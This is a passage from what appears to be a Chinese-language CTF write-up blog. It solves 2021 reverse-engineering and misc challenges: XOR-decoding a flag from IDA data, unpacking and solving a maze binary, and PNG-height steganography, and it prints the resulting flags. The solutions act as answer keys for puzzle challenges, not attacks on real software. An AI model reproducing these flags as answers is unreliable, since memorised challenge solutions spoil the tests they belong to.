punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>unk_6984657 <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">unk_sa7ydu3jb432</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的部分再取最重要的变换的部分为</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>unk_6984657 <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里的<code>(_BYTE *)unk_6984657</code>应该是一个地址，后面的<code>*()</code>的所有内容为如下的数据</p><pre class="line-numbers language-data" data-language="data"><code class="language-data">.rodata:0000000000002008 unk_2008        db  56h ; V             ; DATA XREF: .data:_unk_6984657↓o.rodata:0000000000002009                 db    5.rodata:000000000000200A                 db  53h ; S.rodata:000000000000200B                 db  52h ; R.rodata:000000000000200C                 db    4.rodata:000000000000200D                 db    3.rodata:000000000000200E                 db  53h ; S.rodata:000000000000200F                 db  54h ; T.rodata:0000000000002010                 db    4.rodata:0000000000002011                 db  0Bh.rodata:0000000000002012                 db  53h ; S.rodata:0000000000002013                 db  51h ; Q.rodata:0000000000002014                 db    6.rodata:0000000000002015                 db    6.rodata:0000000000002016                 db  0Fh.rodata:0000000000002017                 db  55h ; U.rodata:0000000000002018                 db    5.rodata:0000000000002019                 db  5Bh ; [.rodata:000000000000201A                 db    3.rodata:000000000000201B                 db  56h ; V.rodata:000000000000201C                 db  0Eh.rodata:000000000000201D                 db    7.rodata:000000000000201E                 db  57h ; W.rodata:000000000000201F                 db  0Eh.rodata:0000000000002020                 db    1.rodata:0000000000002021                 db  0Dh.rodata:0000000000002022                 db  56h ; V.rodata:0000000000002023                 db    0.rodata:0000000000002024                 db    4.rodata:0000000000002025                 db    6.rodata:0000000000002026                 db  0Ah.rodata:0000000000002027                 db  5Dh ; ].rodata:0000000000002028                 db    0.rodata:0000000000002029                 db    0.rodata:000000000000202A unk_202A        db  12h                 ; DATA XREF: init+30↑o.rodata:000000000000202B                 db  54h ; T.rodata:000000000000202C                 db  33h ; 3.rodata:000000000000202D                 db  0Ch.rodata:000000000000202E                 db  0Ah.rodata:000000000000202F                 db  1Ah.rodata:0000000000002030                 db    0.rodata:0000000000002031                 db    0.rodata:0000000000002032                 db    0.rodata:0000000000002033                 db    0.rodata:0000000000002034                 db    0.rodata:0000000000002035                 db    0.rodata:0000000000002036                 db    0.rodata:0000000000002037                 db    0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单整理一下为下面的内容（我不会写也没有ida的脚本，下面的全靠手工整理）</p><pre class="line-numbers language-none"><code class="language-none">key &#x3D; [0x56, 0x5, 0x53, 0x52, 0x4, 0x3, 0x53, 0x54, 0x4, 0x0B, 0x53, 0x51, 0x6, 0x6, 0x0F, 0x55, 0x5, 0x5B, 0x3, 0x56,       0x0E, 0x7, 0x57, 0x0E, 0x1, 0x0D, 0x56, 0x0, 0x4, 0x6, 0x0A, 0x5D, 0x0, 0x0, 0x12, 0x54, 0x33, 0x0C, 0x0A, 0x1A]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>简单逆向一下得flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ss <span class="token operator">=</span> <span class="token string">'5c715207e3abed7dfb7c8ea9c82d0e29'</span>s2 <span class="token operator">=</span> <span class="token string">''</span>key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x5</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x4</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x4</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x5</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span>       <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x7</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x4</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ss<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s2 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>ss<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'DASCTF&#123;'</span> <span class="token operator">+</span> s2 <span class="token operator">+</span> <span class="token string">'&#125;'</span><span class="token punctuation">)</span><span class="token comment"># DASCTF&#123;cfdc11cca823cb81c9456b67b5dd4c8d&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="end"><a href="#end" class="headerlink" title="end"></a>end</h3><p>emmm，因为我 前几天重装了系统，电脑里面没有PE检查工具，开始直接拖入ida32里面去了，但是其实加了一个UPX的壳，要先用工具脱壳再拖入ida32中。</p><p>拖入ida之后肯定是要先看看start函数了，但是没啥发现，直接shift+f12搜索字符串发现flag的痕迹，一路追过去发现关键代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_40238F</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+18h] [ebp-47Ch] BYREF</span>  <span class="token keyword">char</span> Buffer<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+71h] [ebp-423h] BYREF</span>  <span class="token keyword">char</span> v6<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+84h] [ebp-410h] BYREF</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+94h] [ebp-400h] BYREF</span>  <span class="token keyword">int</span> v8<span class="token punctuation">[</span><span class="token number">250</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+98h] [ebp-3FCh] BYREF</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [esp+480h] [ebp-14h]</span>  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [esp+484h] [ebp-10h]</span>  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// [esp+488h] [ebp-Ch]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+48Ch] [ebp-8h]</span>  <span class="token function">sub_402B50</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v11 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>v8<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">do</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>      v0 <span class="token operator">=</span> i<span class="token operator">++</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span>v0<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>      <span class="token keyword">switch</span> <span class="token punctuation">(</span> v7 <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>          v11 <span class="token operator">+=</span> <span class="token number">7</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">8</span><span class="token operator">:</span>          v11 <span class="token operator">-=</span> <span class="token number">7</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">6</span><span class="token operator">:</span>          <span class="token operator">++</span>v11<span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>          <span class="token operator">--</span>v11<span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token operator">:</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>dword_406060<span class="token punctuation">[</span>v11<span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_406060<span class="token punctuation">[</span>v11<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"continue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> dword_406060<span class="token punctuation">[</span>v11<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">35</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> v8<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v1 <span class="token operator">=</span> v9<span class="token operator">++</span><span class="token punctuation">;</span>    v10 <span class="token operator">+=</span> v8<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">sprintf</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">,</span> <span class="token string">"%d"</span><span class="token punctuation">,</span> v10<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_401410</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_401451</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v4<span class="token punctuation">,</span> Buffer<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_401582</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"congratulation"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"the flag is &#123;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v6<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据题目提示”走啊走啊”可以猜测这是一道迷宫题。迷宫的地图为</p><pre class="line-numbers language-data" data-language="data"><code class="language-data">.data:00406064                 db    0.data:00406065                 db    0.data:00406066                 db    0.data:00406067                 db    0.data:00406068                 db    0.data:00406069                 db    0.data:0040606A                 db    0.data:0040606B                 db    0.data:0040606C                 db    0.data:0040606D                 db    0.data:0040606E                 db    0.data:0040606F                 db    0.data:00406070                 db    0.data:00406071                 db    0.data:00406072                 db    0.data:00406073                 db    0.data:00406074                 db    0.data:00406075                 db    0.data:00406076                 db    0.data:00406077                 db    0.data:00406078                 db    0.data:00406079                 db    0.data:0040607A                 db    0.data:0040607B                 db    0.data:0040607C                 db    1.data:0040607D                 db    0.data:0040607E                 db    0.data:0040607F                 db    0.data:00406080                 db    1.data:00406081                 db    0.data:00406082                 db    0.data:00406083                 db    0.data:00406084                 db    0.data:00406085                 db    0.data:00406086                 db    0.data:00406087                 db    0.data:00406088                 db    0.data:00406089                 db    0.data:0040608A                 db    0.data:0040608B                 db    0.data:0040608C                 db    0.data:0040608D                 db    0.data:0040608E                 db    0.data:0040608F                 db    0.data:00406090                 db    0.data:00406091                 db    0.data:00406092                 db    0.data:00406093                 db    0.data:00406094                 db    0.data:00406095                 db    0.data:00406096                 db    0.data:00406097                 db    0.data:00406098                 db    0.data:00406099                 db    0.data:0040609A                 db    0.data:0040609B                 db    0.data:0040609C                 db    1.data:0040609D                 db    0.data:0040609E                 db    0.data:0040609F                 db    0.data:004060A0                 db    0.data:004060A1                 db    0.data:004060A2                 db    0.data:004060A3                 db    0.data:004060A4                 db    1.data:004060A5                 db    0.data:004060A6                 db    0.data:004060A7                 db    0.data:004060A8                 db    1.data:004060A9                 db    0.data:004060AA                 db    0.data:004060AB                 db    0.data:004060AC                 db    1.data:004060AD                 db    0.data:004060AE                 db    0.data:004060AF                 db    0.data:004060B0                 db    0.data:004060B1                 db    0.data:004060B2                 db    0.data:004060B3                 db    0.data:004060B4                 db    0.data:004060B5                 db    0.data:004060B6                 db    0.data:004060B7                 db    0.data:004060B8                 db    1.data:004060B9                 db    0.data:004060BA                 db    0.data:004060BB                 db    0.data:004060BC                 db    1.data:004060BD                 db    0.data:004060BE                 db    0.data:004060BF                 db    0.data:004060C0                 db    1.data:004060C1                 db    0.data:004060C2                 db    0.data:004060C3                 db    0.data:004060C4                 db    0.data:004060C5                 db    0.data:004060C6                 db    0.data:004060C7                 db    0.data:004060C8                 db    1.data:004060C9                 db    0.data:004060CA                 db    0.data:004060CB                 db    0.data:004060CC                 db    0.data:004060CD                 db    0.data:004060CE                 db    0.data:004060CF                 db    0.data:004060D0                 db    0.data:004060D1                 db    0.data:004060D2                 db    0.data:004060D3                 db    0.data:004060D4                 db    0.data:004060D5                 db    0.data:004060D6                 db    0.data:004060D7                 db    0.data:004060D8                 db    0.data:004060D9                 db    0.data:004060DA                 db    0.data:004060DB                 db    0.data:004060DC                 db    0.data:004060DD                 db    0.data:004060DE                 db    0.data:004060DF                 db    0.data:004060E0                 db    0.data:004060E1                 db    0.data:004060E2                 db    0.data:004060E3                 db    0.data:004060E4                 db    1.data:004060E5                 db    0.data:004060E6                 db    0.data:004060E7                 db    0.data:004060E8                 db    0.data:004060E9                 db    0.data:004060EA                 db    0.data:004060EB                 db    0.data:004060EC                 db    1.data:004060ED                 db    0.data:004060EE                 db    0.data:004060EF                 db    0.data:004060F0                 db    0.data:004060F1                 db    0.data:004060F2                 db    0.data:004060F3                 db    0.data:004060F4                 db    0.data:004060F5                 db    0.data:004060F6                 db    0.data:004060F7                 db    0.data:004060F8                 db    1.data:004060F9                 db    0.data:004060FA                 db    0.data:004060FB                 db    0.data:004060FC                 db    1.data:004060FD                 db    0.data:004060FE                 db    0.data:004060FF                 db    0.data:00406100                 db    1.data:00406101                 db    0.data:00406102                 db    0.data:00406103                 db    0.data:00406104                 db    0.data:00406105                 db    0.data:00406106                 db    0.data:00406107                 db    0.data:00406108                 db    1.data:00406109                 db    0.data:0040610A                 db    0.data:0040610B                 db    0.data:0040610C                 db    0.data:0040610D                 db    0.data:0040610E                 db    0.data:0040610F                 db    0.data:00406110                 db    0.data:00406111                 db    0.data:00406112                 db    0.data:00406113                 db    0.data:00406114                 db    1.data:00406115                 db    0.data:00406116                 db    0.data:00406117                 db    0.data:00406118                 db    0.data:00406119                 db    0.data:0040611A                 db    0.data:0040611B                 db    0.data:0040611C                 db    0.data:0040611D                 db    0.data:0040611E                 db    0.data:0040611F                 db    0.data:00406120                 db    0.data:00406121                 db    0.data:00406122                 db    0.data:00406123                 db    0.data:00406124                 db    0.data:00406125                 db    0.data:00406126                 db    0.data:00406127                 db    0.data:00406128                 db    0.data:00406129                 db    0.data:0040612A                 db    0.data:0040612B                 db    0.data:0040612C                 db    0.data:0040612D                 db    0.data:0040612E                 db    0.data:0040612F                 db    0.data:00406130                 db    1.data:00406131                 db    0.data:00406132                 db    0.data:00406133                 db    0.data:00406134                 db    1.data:00406135                 db    0.data:00406136                 db    0.data:00406137                 db    0.data:00406138                 db    1.data:00406139                 db    0.data:0040613A                 db    0.data:0040613B                 db    0.data:0040613C                 db    35<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把上面的数据保存成<code>migong.txt</code>，然后用下面的脚本还原出迷宫</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'migong.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            res <span class="token operator">+=</span> <span class="token string">'\n'</span>        res <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>ress <span class="token operator">=</span> res<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>ress<span class="token punctuation">)</span>res2 <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> ress<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'1'</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>        res2 <span class="token operator">+=</span> <span class="token string">'X'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        res2 <span class="token operator">+=</span> <span class="token string">'O'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以这道题中的迷宫就是下面的这样，至于为什么要把四个比特位似的东西合成一个比特位俺也不知道，回头等比赛结束看看带师傅的博客学习学习。</p><pre class="line-numbers language-migong" data-language="migong"><code class="language-migong">XOOOOOXXOOOOOOXOXXXOOXXXOXOOOOOOXOXOOXXXOXOOXOOOOOOXXX2622668662224422666<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后把exe文件拖入OD中依次输入上面的数字最后弹出flag</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210529190326303.png" alt="动态调试"></p><p><code>DASCTF&#123;f033ab37c30201f73f142449d037028d&#125;</code></p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="RelatedMessage"><a href="#RelatedMessage" class="headerlink" title="RelatedMessage"></a>RelatedMessage</h3><p><strong>泻药，好像是椭圆曲线+rsa？不会没做。</strong></p><h1 id="baby杯-CTFshow六一儿童节特辑"><a href="#baby杯-CTFshow六一儿童节特辑" class="headerlink" title="baby杯(CTFshow六一儿童节特辑)"></a>baby杯(CTFshow六一儿童节特辑)</h1><h2 id="MISC-2"><a href="#MISC-2" class="headerlink" title="MISC"></a>MISC</h2><h3 id="五子棋"><a href="#五子棋" class="headerlink" title="五子棋"></a>五子棋</h3><p>本来都不知道怎么打的，群友们一提示说是开两个人机，让他们互打，最后总有一个会赢，打了三分钟左右成功获得flag</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210602204305469.png" alt="确实不难ao"></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;Wu_J1n_5h0u_H31_X14n_B1_5h3ng@wld13qr0&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="美丽的小姐姐"><a href="#美丽的小姐姐" class="headerlink" title="美丽的小姐姐"></a>美丽的小姐姐</h3><p>简单的高度隐写，直接修改高度即可获得flag</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210602211959461.png" alt="开始时是01B8，改成02B8即可把高度变高"></p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210602212100552.png" alt="image-20210602212100552"></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;BF9FE48F92A9AB8948F5E266E7CE8EB4&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="babyLSB"><a href="#babyLSB" class="headerlink" title="babyLSB"></a>babyLSB</h3><h1 id="Xctf-7月赛"><a href="#Xctf-7月赛" class="headerlink" title="Xctf 7月赛"></a>Xctf 7月赛</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" 